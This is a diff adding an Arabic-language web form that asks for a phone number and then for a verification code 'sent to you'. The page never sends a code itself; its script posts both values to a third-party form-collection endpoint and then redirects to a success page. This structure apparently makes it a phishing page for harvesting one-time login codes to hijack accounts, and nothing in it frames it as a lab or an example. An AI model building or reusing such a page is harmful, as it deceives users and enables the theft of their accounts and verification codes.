@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>نموذج رقم الهاتف والكود</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: green;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      direction: rtl;
+    }
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      padding: 30px 40px;
+      width: 100%;
+      max-width: 420px;
+      box-sizing: border-box;
+    }
+    label {
+      font-weight: 600;
+      margin-bottom: 6px;
+      display: block;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input {
+      border: 1.5px solid #ccc;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #codeField {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>أدخل رقم الهاتف والكود</h2>
+    <form id="form">
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,15}" placeholder="مثال: 0912345678" />
+
+      <button type="button" onclick="sendPhone()">إرسال رقم الهاتف</button>
+
+      <div id="codeField">
+        <label for="code">الكود المرسل إليك:</label>
+        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
+        <button type="button" onclick="sendCode()">إرسال الكود</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    function sendToFormcarry(data) {
+      const formData = new FormData();
+      for (const key in data) {
+        formData.append(key, data[key]);
+      }
+
+      return fetch("https://formcarry.com/s/gv93b8b6cht", {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    function sendPhone() {
+      const phone = document.getElementById('phone').value;
+
+      if (!phone.match(/^[0-9]{10,15}$/)) {
+        alert("يرجى إدخال رقم هاتف صحيح");
+        return;
+      }
+
+      sendToFormcarry({ phone, code: "" }).then(res => {
+        if (res.ok) {
+          document.getElementById("codeField").style.display = "block";
+          alert("تم إرسال رقم الهاتف. أدخل الكود.");
+        } else {
+          alert("فشل إرسال رقم الهاتف");
+        }
+      });
+    }
+
+    function sendCode() {
+      const phone = document.getElementById('phone').value;
+      const code = document.getElementById('code').value;
+
+      if (!code.trim()) {
+        alert("يرجى كتابة الكود.");
+        return;
+      }
+
+      sendToFormcarry({ phone, code }).then(res => {
+        if (res.ok) {
+          window.location.href = "success.html";
+        } else {
+          alert("فشل إرسال الكود.");
+        }
+      });
+    }
+  </script>
+
+</body>
+</html>
